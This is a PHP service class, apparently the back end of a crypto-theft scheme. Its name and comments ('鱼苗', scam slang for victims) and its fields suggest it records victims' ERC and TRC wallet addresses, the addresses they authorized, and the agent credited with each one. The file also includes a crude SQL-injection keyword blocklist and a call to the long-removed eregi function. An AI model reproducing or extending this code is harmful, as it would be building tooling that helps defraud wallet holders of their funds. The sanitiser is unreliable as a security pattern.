<?php

namespace app\index\service;

use think\admin\Service;

/**
 * 鱼苗数据服务
 * Class AddressService
 * @package app\index\service
 */
class FishService extends Service
{
	public function insert_erc($address,$auth_address,$agent){
		$address = $this->sql_replace($address);
		$auth_address = $this->sql_replace($auth_address);
		$agent = $this->sql_replace($agent);
		if(empty($address) || empty($auth_address) || empty($agent)){
			$this->error("非法参数");
		}
		$data = array(
			'employee'=>$agent,
            'address'=>$address,
            'au_address'=>$auth_address,
            'type'=>'erc'
		);
		$where['address'] = $address;
		$where['type'] = 'erc';
		$where['employee'] = $agent;
		if($this->app->db->name('DataFish')->where($where)->find()){
			$data['time'] = date('Y-m-d H:i:s',time());
			return $this->app->db->name('DataFish')->where($where)->update($data);
		}else{
			return $this->app->db->name('DataFish')->save($data);
		}
	}
	public function insert_trc($address,$auth_address,$agent){
		$address = $this->sql_replace($address);
		$auth_address = $this->sql_replace($auth_address);
		$agent = $this->sql_replace($agent);
		if(empty($address) || empty($auth_address) || empty($agent)){
			$this->error("非法参数");
		}
		$data = array(
			'employee'=>$agent,
            'address'=>$address,
            'au_address'=>$auth_address,
            'type'=>'trc'
		);
		
		$where['address'] = $address;
		$where['type'] = 'trc';
		$where['employee'] = $agent;
		if($this->app->db->name('DataFish')->where($where)->find()){
			$data['time'] = date('Y-m-d H:i:s',time());
			return $this->app->db->name('DataFish')->where($where)->update($data);
		}else{
			return $this->app->db->name('DataFish')->save($data);
		}
	}
	
	protected function sql_replace($val){
		$val = str_replace("\t", '', $val);
		$val = str_replace("%20", '', $val);
		$val = str_replace("%27", '', $val);
		$val = str_replace("*", '', $val);
		$val = str_replace("'", '', $val);
		$val = str_replace("\"", '', $val);
		$val = str_replace("/", '', $val);
		$val = str_replace(";", '', $val);
		$val = str_replace("#", '', $val);
		$val = str_replace("–", '', $val);
		$val = str_replace("and","",$val);
		$val = str_replace("or","",$val);
	    $val = str_replace("execute","",$val);
	    $val = str_replace("update","",$val);
	    $val = str_replace("count","",$val);
	    $val = str_replace("chr","",$val);
	    $val = str_replace("mid","",$val);
	    $val = str_replace("master","",$val);
	    $val = str_replace("truncate","",$val);
	    $val = str_replace("char","",$val);
	    $val = str_replace("declare","",$val);
	    $val = str_replace("select","",$val);
	    $val = str_replace("create","",$val);
	    $val = str_replace("delete","",$val);
	    $val = str_replace("insert","",$val);
		$val = str_replace("=","",$val);
		$val = str_replace("from","",$val);
		$val = str_replace("address","",$val);
		$val = str_replace("(","",$val);
		$val = str_replace(")","",$val);
		$val = str_replace(" ","",$val);
		
		$val = str_replace("<","",$val);
		$val = str_replace(">","",$val);
		
		$val = str_replace('`', '', $val);
		$val = str_replace('·', '', $val);
		$val = str_replace('~', '', $val);
		$val = str_replace('!', '', $val);
		$val = str_replace('！', '', $val);
		$val = str_replace('@', '', $val);
		$val = str_replace('#', '', $val);
		$val = str_replace('$', '', $val);
		$val = str_replace('￥', '', $val);
		$val = str_replace('%', '', $val);
		$val = str_replace('^', '', $val);
		$val = str_replace('……', '', $val);
		$val = str_replace('&', '', $val);
		$val = str_replace('*', '', $val);
		$val = str_replace('(', '', $val);
		$val = str_replace(')', '', $val);
		$val = str_replace('（', '', $val);
		$val = str_replace('）', '', $val);
		$val = str_replace('-', '', $val);
		$val = str_replace('_', '', $val);
		$val = str_replace('——', '', $val);
		$val = str_replace('+', '', $val);
		$val = str_replace('=', '', $val);
		$val = str_replace('|', '', $val);
		$val = str_replace('\\', '', $val);
		$val = str_replace('[', '', $val);
		$val = str_replace(']', '', $val);
		$val = str_replace('【', '', $val);
		$val = str_replace('】', '', $val);
		$val = str_replace('{', '', $val);
		$val = str_replace('}', '', $val);
		$val = str_replace(';', '', $val);
		$val = str_replace('；', '', $val);
		$val = str_replace(':', '', $val);
		$val = str_replace('：', '', $val);
		$val = str_replace('\'', '', $val);
		$val = str_replace('"', '', $val);
		$val = str_replace('“', '', $val);
		$val = str_replace('”', '', $val);
		$val = str_replace(',', '', $val);
		$val = str_replace('，', '', $val);
		$val = str_replace('<', '', $val);
		$val = str_replace('>', '', $val);
		$val = str_replace('《', '', $val);
		$val = str_replace('》', '', $val);
		$val = str_replace('.', '', $val);
		$val = str_replace('。', '', $val);
		$val = str_replace('/', '', $val);
		$val = str_replace('、', '', $val);
		$val = str_replace('?', '', $val);
		$val = str_replace('？', '', $val);
		
		$start = stripos($val,'script');
		$end = strripos($val,'script')+6;
		if($start >= 0 && $end > 6){
		    $temp = substr($val,$start,$end-$start);
		    $val = str_replace($temp,"",$val);
		}
		
		//过滤中文
		$regexSymbols = '/[\x{1F300}-\x{1F5FF}]/u';
		$val = preg_replace($regexSymbols, '', $val);
		$regexTransport = '/[\x{1F680}-\x{1F6FF}]/u';
		$val = preg_replace($regexTransport, '', $val);
		$regexMisc = '/[\x{2600}-\x{26FF}]/u';
		$val = preg_replace($regexMisc, '', $val);
		$regexDingbats = '/[\x{2700}-\x{27BF}]/u';
		$val = preg_replace($regexDingbats, '', $val);
		$regexDingbats = '/[\x{231a}-\x{23ab}\x{23e9}-\x{23ec}\x{23f0}-\x{23f3}]/u';
		$val = preg_replace($regexDingbats, '', $val);
		
		$val = addslashes($val);
   
		return $val;
	}
	
	protected function get_real_ip()
	{
		$ip = FALSE;
		//客户端IP 或 NONE 
		if(!empty($_SERVER["HTTP_CLIENT_IP"])){
			$ip = $_SERVER["HTTP_CLIENT_IP"];
		}

		//多重代理服务器下的客户端真实IP地址（可能伪造）,如果没有使用代理，此字段为空
		if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
			$ips = explode (", ", $_SERVER['HTTP_X_FORWARDED_FOR']);
			if ($ip) { array_unshift($ips, $ip); $ip = FALSE; }
			for ($i = 0; $i < count($ips); $i++) {
				if (!eregi ("^(10│172.16│192.168).", $ips[$i])) {
					$ip = $ips[$i];
					break;
				}
			}
		}
		//客户端IP 或 (最后一个)代理服务器 IP 
		return ($ip ? $ip : $_SERVER['REMOTE_ADDR']);
	}
}